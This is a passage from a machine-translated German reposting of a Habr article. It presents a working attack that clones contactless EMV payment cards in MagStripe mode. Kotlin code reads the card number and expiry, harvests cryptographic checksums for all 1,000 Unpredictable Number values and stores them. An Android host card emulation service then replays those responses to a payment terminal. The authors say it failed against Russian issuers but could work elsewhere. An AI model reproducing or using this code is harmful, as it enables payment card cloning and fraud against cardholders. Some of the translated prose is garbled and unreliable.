Befehle und die Aufzählung der Werte von Unpredictable Number in einem Zyklus von 0 bis 999. Wir ändern Nc in "00000 $ {String.format ("% 03d ", i)}". Replace (".. (?! $ ) ". toRegex ()," $ 0 ").  Vergessen Sie nicht, GET_PROCESSING_OPTIONS jedes Mal vor COMPUTE_CRYPTOGRAPHIC_CHECKSUM auszuführen, da sonst der Scheckbetrag nicht berechnet wird. <br><br>  Infolgedessen kann all dies in eine Datei geschrieben und bereits bei der Arbeit mit diesem Terminal verwendet werden.  Hier bekommen wir den Namen und die Kartennummer, wir können sie auf dem Bildschirm anzeigen. <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  Eine Reihe von Befehlen, die wir brauchen. <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  Um das Abhören von Befehlen vom Terminal aus zu implementieren, müssen Sie Ihren Dienst starten und im Manifest deklarieren.  In diesem Dienst kommt ein Befehl vom Terminal zu processCommandApdu. Wir vergleichen ihn mit dem in der Datei gespeicherten und geben die Antwort, die in der nächsten Zeile geschrieben wird. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  Ein paar Screenshots aus der Anwendung.  Wir lesen die Karte und das Parsim-Protokoll: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Somit ist es möglich, den Betrieb einer kontaktlosen EMV-Karte auf einem Telefon mit Kartendaten zu simulieren.  Aber zum Glück oder unglücklicherweise für jemanden funktioniert dieser Angriff in Russland nicht.  Nach unseren Experimenten erreichte die Transaktion ständig die Bank des Emittenten und wurde von der Bank selbst abgelehnt.  Außerdem konnten wir mit MagStripe keine Offline-Transaktion durchführen.  Ein solcher Angriff kann jedoch durchaus in anderen Ländern durchgeführt werden, in denen die Verwendung des MagStripe-Modus weit verbreitet ist und der Risikomanagement-Algorithmus beispielsweise in den USA geringfügig abweicht. <br><br><h4>  Links mit Hilfe dieses Artikels </h4><br>  Bank-Mikroprozessorkarten / I. M. Goldovsky - M .: TsIPSiR: Alpina Pub Lakers, 2010 .-- 686 p. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">EMV-Projekt: Schritt für Schritt</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Forschung österreichischer Forscher</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Link zum Anwendungscode</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Terminalsimulator.</a> <br><br>  Vielen Dank an <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">barracud4</a> für die Unterstützung bei der Vorbereitung dieses Artikels. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de421543/">https://habr.com/ru/post/de421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de421529/index.html">Netflix, Uber, Google und Sie bei MBLT DEV 2018</a></li>
<li><a href="../de421531/index.html">So integrieren Sie ReactJS in 1C-Bitrix mit der automatischen Generierung von Vorlagen im Back-End am Beispiel des Globus-Netzwerks</a></li>
<li><a href="../de421533/index.html">Auswahl einer Programmiersprache: 3 Tipps von einem Programmierer von Apple</a></li>
<li><a href="../de421535/index.html">Abenteuer - Elektronik. Auf einer geflügelten Schaukel in der IT-Welt</a></li>
<li><a href="../de421537/index.html">Funktionen höherer Ordnung in JS: Young Fighter Course</a></li>
<li><a href="../de421545/index.html">Testbericht zum PocketBook 616 - dem preisgünstigsten Taschenbuch für 2018 mit Hintergrundbeleuchtung</a></li>
<li><a href="../de421547/index.html">Akzeptanz unabhängiger Rechenzentren</a></li>
<li><a href="../de421549/index.html">Wir schreiben technische Dokumentation: eine Anleitung für den Laien</a></li>
<li><a href="../de421551/index.html">Vuex meistern - Von Null zu Held</a></li>
<li><a href="../de421553/index.html">Wir teilen technologische Inhalte: Wir haben alle unsere Materialien auf einer Website gesammelt</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>